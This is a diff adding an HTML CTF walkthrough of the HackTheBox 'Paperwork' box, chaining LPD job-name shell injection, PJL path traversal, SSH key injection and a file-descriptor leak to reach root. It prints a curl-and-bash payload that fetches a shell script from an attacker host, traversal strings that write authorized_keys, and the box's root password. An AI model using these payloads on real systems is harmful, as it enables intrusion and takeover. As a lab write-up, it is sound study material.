@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Paperwork — Print Spool Compromise Walkthrough</title>
+<style>
+  body {
+    background-color: #0a0e14;
+    color: #b8c4d0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  a { color: #39d3a7; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  h1 {
+    color: #39ff9d;
+    text-shadow: 0 0 8px rgba(57,255,157,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #39d3a7;
+    border-bottom: 1px solid #1e2a35;
+    padding-bottom: 8px;
+    margin-top: 50px;
+  }
+  h3 { color: #7fe8c8; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    border: 1px solid #2a3a45;
+    color: #8fa3b0;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 3px;
+  }
+  .tag.easy { color: #39ff9d; border-color: #39ff9d; }
+  .meta { color: #6a7a85; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #8fa3b0; }
+  code, pre {
+    background-color: #0f1620;
+    border: 1px solid #1e2a35;
+    color: #7fe8c8;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+  }
+  .callout {
+    background: rgba(57,255,157,0.06);
+    border-left: 3px solid #39ff9d;
+    padding: 12px 18px;
+    margin: 20px 0;
+  }
+  .divider {
+    border: none;
+    border-top: 1px solid #1e2a35;
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #39d3a7; }
+</style>
+</head>
+<body>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Paperwork — Print Spool Compromise Walkthrough</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">CUSTOM PROTOCOL PARSERS</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Paperwork is a beginner-friendly Linux box built entirely around custom, home-rolled implementations
+of legacy printer protocols. Nothing here is a stock CVE — every step is a logic bug in a hand-written
+parser. The full chain:</p>
+
+<ol>
+  <li><b>Shell injection via LPD control file</b> — an unsanitized job-name field lands straight in a
+    <code>shell=True</code> subprocess call</li>
+  <li><b>Foothold as <code>lp</code></b> via reverse shell over the LPD (port 1515) service</li>
+  <li><b>Path traversal in a JetDirect emulator</b> (port 9100, localhost-only) — no containment check
+    on a translated file path</li>
+  <li><b>SSH key injection</b> — traversal used to write an <code>authorized_keys</code> file directly
+    into the service account's home directory</li>
+  <li><b>Forensic-honeypot credential leak</b> — a "security" daemon watching for intrusion signatures
+    accidentally hands us a live file descriptor to a root-owned secrets file via
+    <code>SCM_RIGHTS</code></li>
+  <li><b>Root</b> via reused admin password</li>
+</ol>
+
+<hr class="divider">
+
+<h2>&gt; RECONNAISSANCE</h2>
+
+<pre>nmap -sC -sV -p- --min-rate 5000 --disable-arp-ping &lt;TARGET_IP&gt; -oN nmap_initial.txt</pre>
+
+<p>Results:</p>
+<ul>
+  <li><b>22</b> — OpenSSH</li>
+  <li><b>80</b> — nginx, redirecting to <code>paperwork.htb</code></li>
+  <li><b>1515</b> — an unrecognized service fingerprinting as <code>"Archive_Printer is ready and printing."</code>
+    — this is an <b>LPD (Line Printer Daemon, RFC 1179)</b> service</li>
+</ul>
+
+<p>Added the vhost to <code>/etc/hosts</code> and browsed the site — a plain "Intake Portal" page
+referencing a print archival workflow, a queue named <code>archive_intake</code>, and a maintenance
+notice that the "backend spooler management console is currently offline" — a hint that a management
+component exists somewhere even if it's not directly reachable.</p>
+
+<h2>&gt; STAGE 1: LPD SHELL INJECTION (PORT 1515)</h2>
+
+<p>The LPD server's source was reachable through an unrelated leak on the site. The relevant logic:</p>
+
+<pre>job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log", shell=True)</pre>
+
+<p>The job name comes straight from the <code>J</code> line of an attacker-supplied LPD control file
+and is dropped into a <code>shell=True</code> command with no sanitization. Breaking out of the
+single-quoted string with a stray <code>'</code> lets us chain arbitrary commands.</p>
+
+<div class="callout">
+Reproducing the RFC 1179 framing precisely mattered here — the job-open command (<code>0x02</code> + queue name),
+followed by a control-file subcommand (<code>0x02</code> + size + control filename), followed by the
+raw control file bytes. A custom Python socket client handled all three steps and staged a
+curl-and-execute payload as the injected job name to avoid quoting hell in the reverse shell one-liner
+itself.
+</div>
+
+<p>Payload logic (job name field):</p>
+<pre>x'; curl -s http://&lt;LHOST&gt;:8000/shell.sh -o /tmp/.s.sh; bash /tmp/.s.sh; echo '</pre>
+
+<p>Landed a reverse shell as <code>lp</code>.</p>
+
+<h2>&gt; STAGE 2: ENUMERATION AS lp</h2>
+
+<p>linpeas surfaced a tempting but ultimately unused lead: <code>/usr/bin/bash</code> was world-writable.
+Without a root-owned cron job, timer, or service invoking that binary, though, it was a dead end for this
+chain — a good reminder not to chase the shiniest finding without confirming there's actually a trigger
+for it.</p>
+
+<p>The real thread came from the running process list: a root-owned daemon at
+<code>/usr/bin/paperwork-daemon</code>, and a service running as a separate user, <code>archivist</code>:</p>
+
+<pre>archivi+   982  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log</pre>
+
+<p><code>paperwork-daemon</code>'s source revealed the shape of the rest of the box. It binds a Unix
+socket at <code>/run/paperwork/mgmt.sock</code> (mode <code>660</code>, group <code>archivist</code>), and
+on every connection:</p>
+
+<ul>
+  <li>Checks <code>/home/archivist/printer/logs/commands.log</code> for the strings
+    <code>FSQUERY</code>, <code>FSUPLOAD</code>, or <code>FSDOWNLOAD</code> — real HP PJL filesystem
+    command names</li>
+  <li>If found, it treats the connection as a forensic investigator and, via <code>SCM_RIGHTS</code>,
+    hands over live file descriptors for <b>both</b> the log file <i>and</i>
+    <code>/etc/paperwork/admin_pins.conf</code> — a root-owned secrets file we have no permission to
+    open directly</li>
+  <li>If not found, it returns a signed "system clean" token instead</li>
+</ul>
+
+<p>Two blockers stood between us and that socket: it's only reachable by the <code>archivist</code>
+group, which <code>lp</code> isn't in; and we needed a way to get those trigger strings into the log in
+the first place.</p>
+
+<h2>&gt; STAGE 3: PATH TRAVERSAL IN THE JETDIRECT EMULATOR</h2>
+
+<p><code>jetdirect.py</code> listens on <code>127.0.0.1:9100</code> only, running as <code>archivist</code>.
+It implements a toy PJL filesystem inside a sandboxed root directory — but the path translation has no
+containment check:</p>
+
+<pre>def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))</pre>
+
+<p>A <code>NAME="0:\..\..."</code> value walks straight out of the sandbox. Since the service runs as
+<code>archivist</code>, any file it reads or writes happens with that user's permissions — including
+directories it was never meant to touch, like the account's own home directory one level up.</p>
+
+<p>First pulled the service's own source via its upload command (also handy since <code>lp</code> lacked
+permission to read the file directly through the filesystem):</p>
+
+<pre>@PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=99999</pre>
+
+<p>Then used the download command with a traversal path to drop an SSH key straight into
+<code>archivist</code>'s home directory (the write path even auto-creates missing parent directories):</p>
+
+<pre>@PJL FSDOWNLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=&lt;keylen&gt;
+&lt;public key bytes&gt;</pre>
+
+<p>SSH'd in directly afterward:</p>
+<pre>ssh -i paperwork_archivist archivist@&lt;TARGET_IP&gt;</pre>
+
+<p><b>User flag secured.</b></p>
+
+<h2>&gt; STAGE 4: THE HONEYPOT THAT LEAKS ITS OWN EVIDENCE</h2>
+
+<p>As <code>archivist</code>, the <code>mgmt.sock</code> group restriction was no longer a problem. And
+since the PJL commands sent during the traversal exploit had already written <code>FSUPLOAD</code> and
+<code>FSDOWNLOAD</code> into <code>commands.log</code>, the daemon's malice check was already tripped —
+the very next connection triggered the "lockdown" and its file descriptor leak.</p>
+
+<p>Catching a passed FD over a Unix socket needs <code>recvmsg</code> with an ancillary data buffer sized
+for <code>SCM_RIGHTS</code>, not a plain read:</p>
+
+<pre>fds = array.array("i")
+msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * fds.itemsize))
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds.frombytes(cmsg_data)</pre>
+
+<p>Once unpacked, the two descriptors could be read directly with <code>os.pread(fd, size, 0)</code> —
+no path, no permission check needed, since we already hold the open file handle itself. The second FD
+contained:</p>
+
+<pre>ADMIN_PASSWORD=ApparelMortuaryCedar22</pre>
+
+<h2>&gt; STAGE 5: ROOT</h2>
+
+<p>The leaked admin password was directly reused for the root account:</p>
+
+<pre>su root
+Password: ApparelMortuaryCedar22</pre>
+
+<p><b>Root flag secured.</b></p>
+
+<hr class="divider">
+
+<h2>&gt; LESSONS LEARNED</h2>
+<ul>
+  <li>Not every juicy-looking misconfiguration (the writable <code>/usr/bin/bash</code>) is part of the
+    intended chain — confirm there's an actual trigger (cron, timer, service) before investing time in
+    weaponizing it.</li>
+  <li>Custom re-implementations of legacy protocols (LPD, PJL/JetDirect) are consistently a rich source
+    of parser bugs that real hardened equivalents wouldn't have — treat any bespoke protocol server as
+    the primary attack surface.</li>
+  <li>Security tooling that "helpfully" bundles evidence for humans to review (file handles, log excerpts)
+    can become an exfiltration primitive if the mechanism used to hand off that evidence isn't itself
+    access-controlled per recipient.</li>
+  <li>Passwords surfaced through one channel (an internal admin secrets file) being reused for a
+    completely different privilege boundary (the root account) is what turned a file-read primitive into
+    full compromise.</li>
+</ul>
+
+</body>
+</html>
